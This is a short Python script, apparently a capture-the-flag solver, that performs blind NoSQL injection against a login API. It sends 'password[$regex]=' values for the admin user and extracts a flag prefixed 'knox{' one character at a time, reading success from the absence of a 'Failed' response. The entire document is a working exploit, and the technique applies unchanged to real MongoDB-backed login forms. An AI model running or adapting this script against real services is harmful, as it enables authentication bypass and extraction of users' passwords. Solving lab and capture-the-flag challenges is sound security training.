#!/usr/bin/python3
import re
import requests

def main():
	url  = 'http:///api/login'
	proxy= {
		'http': 'http://127.0.0.1:8080'
	}
	headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'}
	fail_msg = re.compile('Failed')
	flag = "knox\{"
	mydata = "username=admin&password[$regex]="
	alphabates= ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','0','1','2','3','4','5','6','7','8','9','_','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	print("Starting printing flag")
	
	for r in range(39):
		for i in alphabates:
			postdata = mydata+flag+i+'.*'
			#print(postdata)
			res=requests.post(url,headers=headers,data = postdata)
			checkresp = re.search('Failed',res.text)
			if (checkresp):
				#print('wrong')
				pass
			else:
				flag=flag+i
				print(flag, end = "\r")
				break
	print(flag+'\}')
		
if __name__ == '__main__':
	main()
